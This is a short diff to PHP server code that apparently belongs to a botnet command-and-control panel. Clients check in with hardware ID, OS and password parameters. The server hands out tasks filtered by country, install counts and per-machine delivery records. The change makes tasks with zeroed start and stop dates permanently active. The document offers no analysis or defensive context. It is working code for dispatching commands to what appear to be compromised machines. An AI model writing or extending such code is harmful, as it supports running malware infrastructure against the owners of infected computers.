@@ -34,8 +34,10 @@ elseif ($_GET && isset($_GET['hwid']) && isset($_GET['os']) && isset($_GET['pwd'
 	}
 	// tasks
 	$stmt = db_query("SELECT * FROM `tasks` WHERE
-				`start` <= NOW() AND
-				`stop` > NOW() AND
+				(
+					(`start` <= NOW() AND `stop` > NOW()) OR 
+					(`start` = '0000-00-00 00:00:00' and `stop` = '0000-00-00 00:00:00')
+				) AND
 				(`count` = 0 OR `count` > `received`) AND
 				(`countries` = '' OR `countries` LIKE concat('%', :1, '%')) AND
 				(SELECT COUNT(`id`) FROM `sentTasks` WHERE `tid` = `tasks`.`id` AND `hwid` = :2) = 0", $country, $_GET['hwid']);
